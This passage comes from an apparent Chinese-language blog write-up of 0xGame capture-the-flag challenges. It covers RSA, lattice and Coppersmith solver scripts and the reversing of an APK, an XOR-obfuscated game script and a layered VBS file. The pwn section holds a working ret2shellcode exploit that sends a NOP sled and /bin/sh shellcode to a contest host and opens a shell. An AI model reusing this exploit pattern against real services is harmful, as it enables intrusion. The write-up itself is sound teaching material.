<span class=\"comment\"># 寻找合适的基 m</span></span><br><span class=\"line\">        base_m = -<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> m <span class=\"keyword\">in</span> <span class=\"built_in\">sorted</span>(encrypted_data.keys()):</span><br><span class=\"line\">            <span class=\"comment\"># 检查这个基 m 是否能用</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">pow</span>(m, phi_n // p_i, n) != <span class=\"number\">1</span>:</span><br><span class=\"line\">                base_m = m</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> base_m == -<span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;    - Could not find a suitable base in provided data for p_i = <span class=\"subst\">&#123;p_i&#125;</span>. Skipping.&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;    - Using base m = <span class=\"subst\">&#123;base_m&#125;</span> from provided data.&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        m_prime = <span class=\"built_in\">pow</span>(base_m, phi_n // p_i, n)</span><br><span class=\"line\">        c_m = encrypted_data[base_m]</span><br><span class=\"line\">        c_prime = <span class=\"built_in\">pow</span>(c_m, phi_n // p_i, n)</span><br><span class=\"line\">        </span><br><span class=\"line\">        found_x = -<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(p_i):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">pow</span>(m_prime, x, n) == c_prime:</span><br><span class=\"line\">                found_x = x</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> found_x != -<span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;    - Solved! e \\u2261 <span class=\"subst\">&#123;found_x&#125;</span> (mod <span class=\"subst\">&#123;p_i&#125;</span>)&quot;</span>)</span><br><span class=\"line\">            congruences.append((found_x, p_i))</span><br><span class=\"line\">            moduli_product *= p_i</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;    - Failed to solve for e mod <span class=\"subst\">&#123;p_i&#125;</span>.&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> moduli_product &gt; E_UPPER_BOUND:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[+] Collected enough congruences to determine e.&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">            </span><br><span class=\"line\">    <span class=\"keyword\">if</span> moduli_product &lt;= E_UPPER_BOUND:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[-] Could not find enough small prime factors to determine e. The attack failed.&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[*] Solving for e using Chinese Remainder Theorem...&quot;</span>)</span><br><span class=\"line\">    e = chinese_remainder_theorem(congruences)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] Found e: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> gmpy2.is_prime(e):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] Verification successful: e is a prime number.&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[!] Warning: Calculated e is not a prime number.&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[*] Calculating private key d and decrypting the flag...&quot;</span>)</span><br><span class=\"line\">    d = <span class=\"built_in\">pow</span>(e, -<span class=\"number\">1</span>, phi_n)</span><br><span class=\"line\">    flag_val = <span class=\"built_in\">pow</span>(c_flag, d, n)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        flag = long_to_bytes(flag_val)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span> + <span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">50</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[*] DECRYPTED FLAG: <span class=\"subst\">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">50</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> err:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n[-] Failed to decode the flag: <span class=\"subst\">&#123;err&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[*] Decrypted integer value: <span class=\"subst\">&#123;flag_val&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    solve_offline()</span><br></pre></td></tr></table></figure>\n\n<p>类似Pohlig-Hellman攻击，在这个子群里解DLP，解出很多模数互质的解后就可以解原题了，通过很多个加密过的数来逆向还原加密过程，求解e，p，q，从而解出flag：<code>0xGame&#123;69d14068-30b4-41df-a17b-de434c3bc7b8&#125;</code></p>\n<h1 id=\"pwn\"><a href=\"#pwn\" class=\"headerlink\" title=\"pwn\"></a>pwn</h1><h2 id=\"ret2shellcode\"><a href=\"#ret2shellcode\" class=\"headerlink\" title=\"ret2shellcode\"></a>ret2shellcode</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pwn</span><br><span class=\"line\">pwn.context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">p = pwn.remote(<span class=\"string\">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class=\"number\">36618</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b&quot;time&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = pwn.asm(pwn.shellcraft.sh())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># payload: 填充 + NOP滑梯 + Shellcode</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">80</span> + <span class=\"string\">b&#x27;\\x90&#x27;</span> *<span class=\"number\">80</span> + shellcode</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><strong>pwn.shellcraft 会根据 context 自动生成对应的 shellcode</strong></p>\n<ul>\n<li><code>pwn.shellcraft.sh()</code>用pwn里的shellcraft板子sh()生成执行<code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>得到shell的汇编</li>\n<li>然后使用<code>pwn.asm()</code>函数将汇编指令转换成二进制机器码（字节流），这样子发送过去才能被识别。</li>\n<li>最重要的是<code>NOP</code>空指令滑梯，由于程序在80-159之间跳转的偏移是不确定的，若将shellcode放在这个区域,会导致程序不能从第一条shellcode指令开始正确的执行，所以我们可以使用NOP指令（机器码0x90，填充为\\x90），<code>b&#39;\\x90&#39;*80</code>,b’ ‘表示以字节流发送，用<code>\\x90</code>(空指令)填充完这个不确定的区域，让程序就像在一个“滑梯”上向下滑行，直到滑出这个区域，执行我们紧跟在后面的真实 shellcode。</li>\n</ul>\n<p>得到flag：<code>0xGame&#123;Not_only_nop_can_jmp_controlstream&#125;</code></p>\n<h1 id=\"Re\"><a href=\"#Re\" class=\"headerlink\" title=\"Re\"></a>Re</h1><h2 id=\"apk逆向\"><a href=\"#apk逆向\" class=\"headerlink\" title=\"apk逆向\"></a>apk逆向</h2><p><code>_4nd_dex_loader&#125;</code>:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 导入z3库</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> z3 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1. 定义变量</span></span><br><span class=\"line\"><span class=\"comment\"># 每个变量是16个十六进制字符，即 64 位</span></span><br><span class=\"line\">v0, v1, v2 = BitVecs(<span class=\"string\">&#x27;v0 v1 v2&#x27;</span>, <span class=\"number\">64</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 2. 创建求解器实例</span></span><br><span class=\"line\">s = Solver()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 3. 添加数学方程约束</span></span><br><span class=\"line\">s.add(v1 + v0 * <span class=\"number\">3</span> == <span class=\"number\">27454419028250566601</span>)</span><br><span class=\"line\">s.add(v2 * <span class=\"number\">2</span> - v1 * <span class=\"number\">5</span> + <span class=\"number\">20616666104378640363</span> == <span class=\"number\">0</span>)</span><br><span class=\"line\">s.add(v0 + v2 * <span class=\"number\">4</span> == <span class=\"number\">0x1dce62be9f0fa2f6c</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 4. 添加结构性约束</span></span><br><span class=\"line\"><span class=\"comment\"># v1 由 v0 的低32位 (Extract(31, 0, v0)) 和 v2 的高32位 (Extract(63, 32, v2)) 组成</span></span><br><span class=\"line\">s.add(v1 == Concat(Extract(<span class=\"number\">31</span>, <span class=\"number\">0</span>, v0), Extract(<span class=\"number\">63</span>, <span class=\"number\">32</span>, v2)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 5. 检查解是否存在并输出</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> s.check() == sat:</span><br><span class=\"line\">    m = s.model()</span><br><span class=\"line\">    <span class=\"comment\"># 提取v0和v2的值</span></span><br><span class=\"line\">    val_v0 = m[v0].as_long()</span><br><span class=\"line\">    val_v2 = m[v2].as_long()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 将v0和v2的值格式化为16位的十六进制字符串</span></span><br><span class=\"line\">    hex_v0 = <span class=\"built_in\">format</span>(val_v0, <span class=\"string\">&#x27;016x&#x27;</span>)</span><br><span class=\"line\">    hex_v2 = <span class=\"built_in\">format</span>(val_v2, <span class=\"string\">&#x27;016x&#x27;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 最终的输入字符串 str 是 v0 和 v2 的拼接</span></span><br><span class=\"line\">    flag_hex = hex_v0 + hex_v2</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;求解成功!&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;v0 = 0x<span class=\"subst\">&#123;hex_v0&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;v2 = 0x<span class=\"subst\">&#123;hex_v2&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;拼接后的Hex字符串: <span class=\"subst\">&#123;flag_hex&#125;</span>&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 将十六进制字符串转换为ASCII字符</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        flag_ascii = <span class=\"built_in\">bytes</span>.fromhex(flag_hex).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;ASCII结果: <span class=\"subst\">&#123;flag_ascii&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;转换为ASCII失败: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;求解失败，方程无解。&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>资源文件–&gt;Assets–&gt;dex.zip,<strong>.zip文件一般是不会出现在这里的</strong>，所以flag的关键应该就放在这里面，导出这个dex.zip文件，解压缩，010打开查看文件头，是<strong>64 65 78 0A</strong>，所以这个其实并不是zip，而是一个dex文件，更改文件名为dex.dex，用jadx打开，就能看到反编译的源码了，用z3解方程组，得到后半段<code>_4nd_dex_loader&#125;</code></p>\n<p><code>0xGame&#123;Do_y0u_l0v3_andr01d</code>:</p>\n<p>前半段在源代码–&gt;com–&gt;example.easyapp–&gt;MainActivity–&gt;onCreate$lambda$方法中找到base64编码过的flag：<code>MHhHYW1le0RvX3kwdV9sMHYzX2FuZHIwMWQ=</code></p>\n<p>解码得到<code>0xGame&#123;Do_y0u_l0v3_andr01d</code></p>\n<p>拼接flag得到：<code>0xGame&#123;Do_y0u_l0v3_andr01d_4nd_dex_loader&#125;</code></p>\n<p><strong>一般都在源代码–&gt;com–&gt;MainActivity里面</strong></p>\n<h2 id=\"扫雷\"><a href=\"#扫雷\" class=\"headerlink\" title=\"扫雷\"></a>扫雷</h2><p>分析<code>.js</code>文件，可以看到触发给flag的逻辑，当难度为expert时玩家胜利会触发<code>_0x20eae2</code>这个函数，函数内部调用了<code>_0x172ca4</code>函数，这里包含了解密flag的逻辑–<strong>重复密钥异或</strong>(XOR)，密钥key–<code>WebIsInteresting</code>和flag密文<code>g\\x1d%(\\x1e,\\x15@SA\\x5cFD\\x0fWJn]P&#125;^&#125;\\x0c\\x12\\x07_]AGYC^o\\x04\\x00yA-ZGT\\x16U\\x0e</code>，</p>\n<p>逆向解密：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">encrypted_data = <span class=\"string\">b&quot;g\\x1d%(\\x1e,\\x15@SA\\x5cFD\\x0fWJn]P&#125;^&#125;\\x0c\\x12\\x07_]AGYC^o\\x04\\x00yA-ZGT\\x16U\\x0e&quot;</span></span><br><span class=\"line\">key = <span class=\"string\">b&quot;WebIsInteresting&quot;</span></span><br><span class=\"line\">decrypted_data = <span class=\"built_in\">bytearray</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(encrypted_data)):</span><br><span class=\"line\">  decrypted_data.append(encrypted_data[i] ^ key[i % <span class=\"built_in\">len</span>(key)])</span><br><span class=\"line\"></span><br><span class=\"line\">flag = decrypted_data.decode()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n\n<p>得到flag：<code>0xGame&#123;463950f9-9824-4bfb-8230-98ab02d431d0&#125;</code></p>\n<h2 id=\"VBS\"><a href=\"#VBS\" class=\"headerlink\" title=\"VBS\"></a>VBS</h2><p>把<code>Execute</code>改为<code>wscript.echo</code>，然后在终端输入<code>cscript.exe 1.vbs</code>就能得到源代码输出到终端，</p>\n<ul>\n<li><code>wscript.exe 1.vbs</code>   输出到一个程序窗口，不方便复制，</li>\n<li><code>cscript.exe 1.vbs</code>    输出到终端，更方便复制。</li>\n</ul>\n<p>可以观察到源码分两段，中间有<code>Execute Code</code>分隔，修改原.vbs，最后一行加上<code>Wscripts.Echo</code>，就能看到去了第二层混淆的源码，</p>\n<p>但是再观察一下，后面还是好几行的乱码，于是再进行<code>Execute</code>到<code>Wscript.Echo</code>的转换，三层混淆，我没招了😭😭</p>\n<p>三层混淆解完之后，就能看到base64编码表<code>fx6LUY5at9lnwmd3TbqzuRy+AipWHPDoXZKMFGCV2I/QjSreEsh18NJkg0v74OcB</code>和flag密文<code>waZaAyNGDJ9CwLfNdzYCnyUsAJtSmLU0wqNKmLYFnyT8iyRMi5UEAMH0da8=</code>，放到cyberchef里解一下密，得到flag：<code>0xGame&#123;bf00591f-a1cb-4191-b41d-d4eecda0b798&#125;</code></p>\n","excerpt":"","more":"<h1 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h1><h2 id=\"Ez-LLL\"><a href=\"#Ez-LLL\" class=\"headerlink\" title=\"Ez_LLL\"></a>Ez_LLL</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\"></span><br><span class=\"line\">p = <span class=\"number\">151240196317566398919874094060690044886978001146739221635377812709640347441550250665168046149125216617951660209690860015625296899030453965800801283336223544189902980591153121592938172963303968803995733283426759581586368403208379337416298836517168491618212440911971420911495272791409112867645195821357346746831</span></span><br><span class=\"line\">h = <span class=\"number\">124332746104765845147133491132959579184849644379099440465281812273660434050281263409975356196112560300248343107170084466976976410232928660489912629913525776979726428263975968343564076005019264661696777686114079504603568726429498116488469855127100166072195548037981863885014261706582936943023968781022607949646</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Build lattice</span></span><br><span class=\"line\">M = matrix(ZZ, [</span><br><span class=\"line\">    [<span class=\"number\">1</span>, h],</span><br><span class=\"line\">    [<span class=\"number\">0</span>, p]</span><br><span class=\"line\">])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># LLL reduction</span></span><br><span class=\"line\">L = M.LLL()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> L:</span><br><span class=\"line\">    f_candidate = <span class=\"built_in\">abs</span>(row[<span class=\"number\">0</span>])</span><br><span class=\"line\">    g_candidate = <span class=\"built_in\">abs</span>(row[<span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"comment\"># Check if g_candidate is 350-bit prime</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> g_candidate.nbits() == <span class=\"number\">350</span> <span class=\"keyword\">and</span> is_prime(g_candidate):</span><br><span class=\"line\">        flag = long_to_bytes(f_candidate)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">b&#x27;0xGame&#x27;</span> <span class=\"keyword\">in</span> flag:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Found flag:&quot;</span>, flag)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p>LLL 格基规约算法，得到<code>0xGame&#123;8dc1f4b8-3f4e-4c3e-9d1a-2b5e6f7a8b9c&#125;</code></p>\n<h2 id=\"Copper\"><a href=\"#Copper\" class=\"headerlink\" title=\"Copper\"></a>Copper</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">n = <span class=\"number\">92873040755425037862453595432032305849700597051458113741962060511759338242511707376645887864988028778023918585157853023538298808432423892753226386473625357887471318145132753202886684219309732628049959875215531475307942392884965913932053771541589293948849554008069165822411930991003624635227296915315188938427</span></span><br><span class=\"line\">gift = <span class=\"number\">10911712225716809560802315710689854621004330184657267444255298781464639032414821020145885934381310240257843204972266622870698161556175406337237650652528640</span></span><br><span class=\"line\"></span><br><span class=\"line\">pbits = <span class=\"number\">512</span></span><br><span class=\"line\">kbits = <span class=\"number\">242</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 直接使用标准已知高位分解方法</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">factor_with_high_bits</span>(<span class=\"params\">n, high, unknown_bits, p_total_bits=<span class=\"number\">512</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">from</span> sage.<span class=\"built_in\">all</span> <span class=\"keyword\">import</span> Zmod, PolynomialRing</span><br><span class=\"line\">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class=\"line\">    f = high + x</span><br><span class=\"line\">    <span class=\"comment\"># 尝试不同的 beta 值</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> beta <span class=\"keyword\">in</span> [<span class=\"number\">0.48</span>, <span class=\"number\">0.45</span>, <span class=\"number\">0.42</span>, <span class=\"number\">0.4</span>, <span class=\"number\">0.38</span>, <span class=\"number\">0.35</span>]:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> epsilon <span class=\"keyword\">in</span> [<span class=\"number\">0.01</span>, <span class=\"number\">0.03</span>, <span class=\"number\">0.05</span>, <span class=\"number\">0.08</span>, <span class=\"number\">0.1</span>]:</span><br><span class=\"line\">            roots = f.small_roots(X=<span class=\"number\">2</span>^unknown_bits, beta=beta, epsilon=epsilon)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> roots:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> roots[<span class=\"number\">0</span>]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\">x0 = factor_with_high_bits(n, gift, kbits)</span><br><span class=\"line\"><span class=\"keyword\">if</span> x0 <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">    p = gift + <span class=\"built_in\">int</span>(x0)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> n % p == <span class=\"number\">0</span>:</span><br><span class=\"line\">        q = n // p</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;成功分解!&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;p = <span class=\"subst\">&#123;p&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;q = <span class=\"subst\">&#123;q&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 解密</span></span><br><span class=\"line\">        e = <span class=\"number\">65537</span></span><br><span class=\"line\">        c = <span class=\"number\">78798946231057858237017891544035026520248922588969396262361286907576401467816384819451190528802344534495780520382462432888103466971743435370588783181267466189564132373143717299869053172848786781320750631382630113459268771330862538801774075395201914653025347332312015985213462835680853607187971669296490439714</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        phi = (p-<span class=\"number\">1</span>) * (q-<span class=\"number\">1</span>)</span><br><span class=\"line\">        d = <span class=\"built_in\">pow</span>(e, -<span class=\"number\">1</span>, phi)</span><br><span class=\"line\">        m = <span class=\"built_in\">pow</span>(c, d, n)</span><br><span class=\"line\">        <span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\">        flag = long_to_bytes(<span class=\"built_in\">int</span>(m))</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Flag: <span class=\"subst\">&#123;flag&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;p 不整除 n&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;没有找到解&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>Coppersmith是一种用来求解多项式方程小根的方法.</p>\n<p>在<code>sagemath</code>里运行上面的脚本，得到flag：<code>0xGame&#123;C0pp3r_4nd_mu1t1pl3_pr0gr3ss1ng!!!&#125;</code></p>\n<h2 id=\"LLL\"><a href=\"#LLL\" class=\"headerlink\" title=\"LLL\"></a>LLL</h2><ol>\n<li><strong>构造格 (Lattice)</strong>：我们将从 output.txt 文件中读出的矩阵的行向量作为格的一组基。</li>\n<li><strong>运行 LLL 算法</strong>：对这组基进行 LLL 规约，算法会找到一组新的基，其中包含一些非常短的向量。</li>\n<li><strong>寻找 Flag</strong>：我们要找的 flag 向量就隐藏在这些短向量中。由于矩阵乘法的影响，找到的短向量可能是原始 flag 向量的某个整数倍（例如 k * flag）。</li>\n<li><strong>恢复 Flag</strong>：<ul>\n<li>我们遍历规约后基里的每一个短向量。</li>\n<li>计算向量中所有元素的最大公约数（GCD），这个 GCD 可能就是 k。</li>\n<li>将整个向量除以 k（或 -k），得到候选的 flag 向量。</li>\n<li>检查候选向量的每个元素是否都在有效的 ASCII 范围内，并尝试将其转换为字符串。</li>\n<li>验证字符串是否符合 0xGame{…} 的格式。</li>\n</ul>\n</li>\n</ol>\n<p>注意本题的.txt中的矩阵需要先进行<strong>转置</strong>，再LLL规约。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span 